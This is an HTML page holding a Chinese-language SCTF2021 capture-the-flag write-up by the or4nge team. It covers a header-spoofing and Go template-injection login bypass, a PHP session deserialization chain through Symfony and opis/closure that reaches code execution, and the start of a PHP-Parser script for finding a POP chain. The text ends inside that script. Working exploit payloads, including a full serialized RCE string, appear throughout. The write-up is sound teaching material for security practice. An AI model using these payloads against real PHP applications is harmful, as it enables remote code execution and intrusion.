<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SCTF2021 14th'><title>SCTF2021 Writeup by or4nge</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='SCTF2021 Writeup by or4nge'>
<meta property='og:description' content='SCTF2021 14th'>
<meta property='og:url' content='https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='SCTF' /><meta property='article:tag' content='XCTF' /><meta property='article:published_time' content='2021-12-28T16:23:17&#43;08:00'/><meta property='article:modified_time' content='2021-12-28T16:23:17&#43;08:00'/><meta property='og:image' content='https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/cover.png' />
<meta name="twitter:title" content="SCTF2021 Writeup by or4nge">
<meta name="twitter:description" content="SCTF2021 14th"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/cover.png' />
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/sctf2021-writeup-by-or4nge/">
                <img src="/post/sctf2021-writeup-by-or4nge/cover_hu20e70d2f1ec0ceae4e2274ecf0db6e8c_615875_800x0_resize_box_3.png"
                        srcset="/post/sctf2021-writeup-by-or4nge/cover_hu20e70d2f1ec0ceae4e2274ecf0db6e8c_615875_800x0_resize_box_3.png 800w, /post/sctf2021-writeup-by-or4nge/cover_hu20e70d2f1ec0ceae4e2274ecf0db6e8c_615875_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="387" 
                        loading="lazy"
                        alt="Featured image of post SCTF2021 Writeup by or4nge" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/sctf2021-writeup-by-or4nge/">SCTF2021 Writeup by or4nge</a>
    </h2>

    
    <h3 class="article-subtitle">
        SCTF2021 14th
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Dec 28, 2021</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    26 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="web">Web</h2>
<h3 id="loginme">loginme</h3>
<p>第一步绕过本地验证，<code>x-forwarded-for</code> 和 <code>client-ip</code> 被过滤了，<code>X-Real-IP:127.0.0.1</code> 绕过</p>
<p>第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 <code>{{.Password}}</code> 就可以获得 admin 结构体中的 Password 变量值了。</p>
<p>http://124.71.166.197:18001/admin/index?id=5&amp;age={{.Password}}</p>
<h3 id="upload_it">Upload_it</h3>
<p>可以任意上传 <code>/tmp</code> 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 <code>upload_path|$serialize</code> 写进 <code>/tmp/sess_or4nge</code>，然后改自己的 session_id 为 or4nge，即可触发反序列化。</p>
<p>利用给的 Composer.json：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#e6db74">&#34;symfony/string&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;^5.3&#34;</span><span style="color:#960050;background-color:#1e0010">,</span>
<span style="color:#e6db74">&#34;opis/closure&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;^3.6&#34;</span>
</code></pre></div><p>结合出题人发布的文章 <a class="link" href="https://www.anquanke.com/post/id/217929#h2-3"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/217929#h2-3</a> 找到一条链，其中 lazystring 的任意无参数函数调用接的是闭包函数 <code>__invoke</code>，可以将闭包函数序列化进去。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">Symfony\Component\String</span>{
    <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#34;path</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">o\autoload.php&#34;</span>;
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LazyString</span>{
        <span style="color:#66d9ef">private</span> $value;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
        {
            $func <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag&#34;</span>);};
            $d <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\Opis\Closure\SerializableClosure</span>($func);
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> $d;
        }

    }
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UnicodeString</span>{
        <span style="color:#66d9ef">protected</span> $string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
        {
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LazyString</span>;
        }
    }
}
<span style="color:#66d9ef">namespace</span> {
    $exp<span style="color:#f92672">=</span><span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Symfony\Component\String\UnicodeString</span>())));

}
</code></pre></div><p>其实这条链本地没有打通，原因是因为在 UnicodeString.php 里，对 <code>$this-&gt;string</code> 进行了限制</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
    {
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">\is_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span>)) {
            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\BadMethodCallException</span>(<span style="color:#e6db74">&#39;Cannot unserialize &#39;</span><span style="color:#f92672">.</span><span style="color:#66d9ef">__CLASS__</span>);
        }

        <span style="color:#a6e22e">normalizer_is_normalized</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span>) <span style="color:#f92672">?:</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">normalizer_normalize</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">string</span>);
    }
</code></pre></div><p>但是猜到出题人以前发布过，直接盲打过去，RCE 成功。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">upload_path<span style="color:#f92672">|</span>O<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A38<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>Symfony<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CComponent<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CString<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CUnicodeString<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A1<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A9<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">00</span>string<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>BO<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A35<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>Symfony<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CComponent<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CString<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CLazyString<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A1<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A42<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span>Symfony<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CComponent<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CString<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CLazyString<span style="color:#f92672">%</span><span style="color:#ae81ff">00</span>value<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>BC<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A32<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>Opis<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CClosure<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CSerializableClosure<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A196<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Ba<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A5<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A3<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>use<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Ba<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A0<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Ds<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A8<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>function<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A32<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>function<span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Bsystem<span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>cat<span style="color:#f92672">+%</span><span style="color:#ae81ff">2</span>Fflag<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A5<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>scope<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A35<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>Symfony<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CComponent<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CString<span style="color:#f92672">%</span><span style="color:#ae81ff">5</span>CLazyString<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A4<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>this<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>BN<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A4<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span>self<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bs<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A32<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>A<span style="color:#f92672">%</span><span style="color:#ae81ff">2200000000034</span>bf950000000005225a861<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D
</code></pre></div><h3 id="fumo_on_the_christmas_tree">FUMO_on_the_Christmas_tree</h3>
<p>强网杯 pop_master 魔改的题</p>
<p>首先是对 <code>__invoke</code> 和 <code>__call</code> 的魔术方法的类进行改写，全部能改写为正常的形式：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> re
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">erase_call</span>(FILEIN, FILEOUT):
    fp <span style="color:#f92672">=</span> open(FILEIN, <span style="color:#e6db74">&#39;rb&#39;</span>)
    fo <span style="color:#f92672">=</span> open(FILEOUT, <span style="color:#e6db74">&#39;wb&#39;</span>)
    FILE <span style="color:#f92672">=</span> [_<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> fp<span style="color:#f92672">.</span>readlines()]
    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> len(FILE):
        line <span style="color:#f92672">=</span> FILE[i]
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;__call&#39;</span> <span style="color:#f92672">in</span> line:
            l1, l2 <span style="color:#f92672">=</span> FILE[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], FILE[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>]
            use_func <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;extract\(\[\$name =&gt; </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">(.*)</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">\]\);&#39;</span>, l1)[<span style="color:#ae81ff">1</span>]
            pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;if \(is\_callable\(\[\$this\-\&gt;(.*)\, \$(.*)\]\)\)&#39;</span>, l2)
            obj_name, func_name <span style="color:#f92672">=</span> pattern[<span style="color:#ae81ff">1</span>], pattern[<span style="color:#ae81ff">2</span>] 
            new_code <span style="color:#f92672">=</span> []
            new_code<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;    public function </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">($value) {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> func_name)
            new_code<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;        if (is_callable([$this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">])) @$this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">($value);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (obj_name, use_func, obj_name, use_func))
            new_code<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;    }</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> new_code:
                fo<span style="color:#f92672">.</span>write(j<span style="color:#f92672">.</span>encode())
            i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>
        <span style="color:#66d9ef">else</span>:
            fo<span style="color:#f92672">.</span>write((line <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>encode())
        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
    fp<span style="color:#f92672">.</span>close()        
    fo<span style="color:#f92672">.</span>close()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">erase_invoke</span>(FILEIN, FILEOUT):
    fp <span style="color:#f92672">=</span> open(FILEIN, <span style="color:#e6db74">&#39;rb&#39;</span>)
    fo <span style="color:#f92672">=</span> open(FILEOUT, <span style="color:#e6db74">&#39;wb&#39;</span>)
    FILE <span style="color:#f92672">=</span> [_<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> fp<span style="color:#f92672">.</span>readlines()]
    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> len(FILE):
        line <span style="color:#f92672">=</span> FILE[i]
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;@call_user_func&#39;</span> <span style="color:#f92672">in</span> line:
            pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;call_user_func\(\$this\-\&gt;(.*)\, \[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">(.*)</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> \=\&gt; \$(.*)\]\);&#39;</span>, line)
            <span style="color:#75715e"># print(pattern)</span>
            obj_name, use_func, func_para <span style="color:#f92672">=</span> pattern[<span style="color:#ae81ff">1</span>], pattern[<span style="color:#ae81ff">2</span>], pattern[<span style="color:#ae81ff">3</span>]
            <span style="color:#75715e"># print(obj_name, use_func, func_para)</span>
            new_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;        if (is_callable([$this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;])) @$this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (obj_name, use_func, obj_name, use_func, func_para)
            fo<span style="color:#f92672">.</span>write(new_code<span style="color:#f92672">.</span>encode())
        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;__invoke&#34;</span> <span style="color:#f92672">in</span> line:
            l1, l2 <span style="color:#f92672">=</span> FILE[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], FILE[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>]
            key <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\$key = base64_decode\(</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">(.*)</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">\);&#39;</span>, l1)[<span style="color:#ae81ff">1</span>]
            key <span style="color:#f92672">=</span> b64decode(key<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
            pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\$this\-\&gt;(.*)\-\&gt;(.*)\(\$value\[\$key\]\);&#39;</span>, l2)
            <span style="color:#66d9ef">try</span>:
                obj_name, use_func <span style="color:#f92672">=</span> pattern[<span style="color:#ae81ff">1</span>], pattern[<span style="color:#ae81ff">2</span>]
            <span style="color:#66d9ef">except</span>:
                print(line)
                print(l1)
                print(l2)
            new_code <span style="color:#f92672">=</span> []
            new_code<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;    public function </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">($value) {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> key)
            new_code<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;        if (is_callable([$this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">])) @$this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">($value);</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (obj_name, use_func, obj_name, use_func))
            new_code<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;    }</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> new_code:
                fo<span style="color:#f92672">.</span>write(j<span style="color:#f92672">.</span>encode())
            i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">3</span>
        <span style="color:#66d9ef">else</span>:
            fo<span style="color:#f92672">.</span>write((line <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>encode())
        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
    fp<span style="color:#f92672">.</span>close()        
    fo<span style="color:#f92672">.</span>close()

erase_invoke(<span style="color:#e6db74">&#39;class.code.txt&#39;</span>, <span style="color:#e6db74">&#39;mid_class.txt&#39;</span>)
erase_call(<span style="color:#e6db74">&#39;mid_class.txt&#39;</span>, <span style="color:#e6db74">&#39;final_class.txt&#39;</span>)
</code></pre></div><p>在最终代码里手动把 namespace christmasTree 里去掉，之后进行 PHP_Paser 对这份代码进行语法树构建分析：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;memory_limit&#39;</span>, <span style="color:#e6db74">&#39;1024M&#39;</span>);
<span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;path\to\autoload.php&#39;</span>;
<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#66d9ef">use</span> <span style="color:#a6e22e">PhpParser\Error</span>; <span style="color:#75715e">//use to catch error
</span><span style="color:#75715e"></span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">PhpParser\NodeDumper</span>; <span style="color:#75715e">//use to read node
</span><span style="color:#75715e"></span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">PhpParser\ParserFactory</span>; <span style="color:#75715e">//use to anlaysis code
</span><span style="color:#75715e"></span><span style="color:#66d9ef">use</span> <span style="color:#a6e22e">PhpParser\PrettyPrinter</span>;

$inputPhpFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;final_class.txt&#39;</span>;

$code <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($inputPhpFile);

$parser <span style="color:#f92672">=</span> (<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ParserFactory</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">create</span>(<span style="color:#a6e22e">ParserFactory</span><span style="color:#f92672">::</span><span style="color:#a6e22e">PREFER_PHP7</span>);
<span style="color:#66d9ef">try</span> {
    $stmts <span style="color:#f92672">=</span> $parser<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parse</span>($code);
} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Error</span> $e) {
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Parse error:</span><span style="color:#e6db74">{</span>$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>()<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>);
}
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;[+] get file done</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
$deleteCnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
$deleteCla <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
$nodeDumper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">NodeDumper</span>;
$class_num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

$func_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
